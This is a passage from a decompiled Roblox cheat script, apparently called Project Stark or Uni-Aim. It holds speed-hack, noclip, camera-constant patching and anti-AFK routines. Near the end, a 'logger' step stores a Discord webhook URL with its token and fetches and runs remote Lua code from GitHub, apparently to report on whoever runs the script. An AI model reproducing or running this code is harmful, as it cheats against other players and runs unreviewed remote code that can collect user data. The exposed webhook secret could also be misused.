			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_183
		end)
		local v185 = v8:Tab("Credits")
		v185:Button("Made by Urbanstorm", function()
			pcall(function()
				setclipboard("Urbanstorm")
			end)
		end)
		v185:Button("https://discord.gg/vgYZApyrZC - Click to copy", function()
			pcall(function()
				setclipboard("https://discord.gg/vgYZApyrZC")
			end)
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_183
			(function()
				-- upvalues: (ref) v_u_183
				while true do
					pcall(function()
						-- upvalues: (ref) v_u_183
						wait(0.5)
						if game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= v_u_183 then
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_183
						end
					end)
				end
			end)()
		end)
		task.spawn(function()
			pcall(function()
				game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
				local v186 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts").PlayerModule.CameraModule.ZoomController.Popper
				local v187 = next
				local v188, v189 = getgc()
				while true do
					local v190
					v189, v190 = v187(v188, v189)
					if v189 == nil then
						break
					end
					if getfenv(v190).script == v186 and typeof(v190) == "function" then
						local v191 = next
						local v192, v193 = debug.getconstants(v190)
						while true do
							local v194
							v193, v194 = v191(v192, v193)
							if v193 == nil then
								break
							end
							if tonumber(v194) ~= 0.25 then
								if tonumber(v194) == 0 then
									debug.setconstant(v190, v193, 0.25)
								end
							else
								debug.setconstant(v190, v193, 0)
							end
						end
					end
				end
				local v195, v196, v197 = pairs(game.Players.LocalPlayer.Character:GetChildren())
				while true do
					local v198
					v197, v198 = v195(v196, v197)
					if v197 == nil then
						break
					end
					if v198.ClassName == "Part" or v198.ClassName == "MeshPart" then
						v198.CanCollide = false
					end
				end
			end)
		end)
		task.spawn(function()
			pcall(function()
				local v_u_199 = game:GetService("VirtualUser")
				game:GetService("Players").LocalPlayer.Idled:connect(function()
					-- upvalues: (ref) v_u_199
					v_u_199:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
					wait(1)
					v_u_199:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
				end)
			end)
		end)
		pcall(function()
			-- upvalues: (ref) v_u_15
			v_u_15.Load()
		end)
		pcall(function()
			-- upvalues: (ref) v_u_16
			v_u_16.Load()
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_3
			pcall(function()
				-- upvalues: (ref) v_u_3
				if v_u_3 ~= false then
					warn("[Project Stark] Logger DISABLED")
				else
					getgenv().Webyhookie = "https://discord.com/api/webhooks/1429629541374099517/4AhDV-Ah8cT8fG-X1u4edqeafcfQFLULCxi3wEgv8TSBkLldmoG7HHLeTbRYGiQkTRnR"
					getgenv().Titlewebyhookie = "\240\159\154\168 Uni-Aim"
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Log.lua"))()
				end
			end)
		end)
	end
end
return v1["script.lua"](...)
